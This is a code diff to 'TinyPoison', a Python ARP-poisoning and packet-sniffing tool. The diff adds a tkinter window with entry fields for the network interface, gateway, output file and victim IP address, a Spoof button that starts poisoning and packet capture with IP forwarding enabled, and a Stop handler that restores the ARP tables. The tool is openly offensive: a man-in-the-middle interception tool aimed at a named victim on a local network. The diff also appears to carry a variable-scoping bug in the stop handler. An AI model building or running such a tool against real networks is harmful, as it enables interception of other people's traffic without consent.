@@ -17,11 +17,12 @@
 
 try:
 	import os, json, sys, netifaces
+	from tkinter import *
 	from scapy.all import *
 except:
 	print("Couldn't load libraries!")
 	print("Please make sure you have the following libs installed:")
-	print("os json sys netifaces scapy")
+	print("os json sys netifaces scapy tkinter")
 	sys.exit(1)
 
 # Function to get MAC address from IP (duh)
@@ -66,26 +67,29 @@ def sniffer():
 		print("Error sniffing packets.")
 		sys.exit(1)
 
+def stop_spoof():
+	undo_arp_poison(router_ip_address, victim_ip_address) # Cure ARP poisoning
+	os.system("echo 0 > /proc/sys/net/ipv4/ip_forward") # Undo setup
+	sys.exit(1) # Exit
+
 # Actually do the ARP poisoning
 def spoof_arp():
+	victim_ip_address = victim_input.get()
+	spoof_button.config(text="Stop", command=stop_spoof)
 	os.system("echo 1 > /proc/sys/net/ipv4/ip_forward") # Setup
 	while 1:
 		try:
 			spoof(router_ip_address, victim_ip_address) # Poison ARP
 			time.sleep(1) # Wait
 			sniffer() # Sniff for packets
-		except KeyboardInterrupt: # Ctrl+C
-			undo_arp_poison(router_ip_address, victim_ip_address) # Cure ARP poisoning
-			os.system("echo 0 > /proc/sys/net/ipv4/ip_forward") # Undo setup
-			sys.exit(1) # Exit
 		except:
 			print("Unknown error.")
 			sys.exit(1)
 
 if __name__ == "__main__":
-	print("TinyPoison 1.1")
+	print("TinyPoison 1.2")
 	
-	# Load config file
+	# Load config
 	try:
 		with open("config.json") as configfile:
 			config = json.load(configfile)
@@ -111,11 +115,27 @@ if __name__ == "__main__":
 	output_file_name = config["output_file_name"]
 	print("Output file name set to: " + output_file_name)
 	
-	# Get victim IP address
+	# Create window contents
+	root = Tk()
+	Label(root, text="Network interface:").pack()
+	interface_input = Entry(root)
+	interface_input.pack()
+	interface_input.insert(0, interface)
+	Label(root, text="Gateway IP address:").pack()
+	gateway_input = Entry(root)
+	gateway_input.pack()
+	gateway_input.insert(0, router_ip_address)
+	Label(root, text="Output file name:").pack()
+	output_input = Entry(root)
+	output_input.pack()
+	output_input.insert(0, output_file_name)
+	Label(root, text="Victim IP address:").pack()
+	victim_input = Entry(root)
+	victim_input.pack()
 	if(config["victim_ip"] == "ask"):
-		print("Please enter victim's IP address.")
-		victim_ip_address = input(">")
+		victim_input.insert(0, "Victim IP Here")
 	else:
-		victim_ip_address = config["victim_ip"]
-	
-	spoof_arp()
+		victim_input.insert(0, config["victim_ip"])
+	spoof_button = Button(root, text="Spoof", command=spoof_arp)
+	spoof_button.pack()
+	root.mainloop()
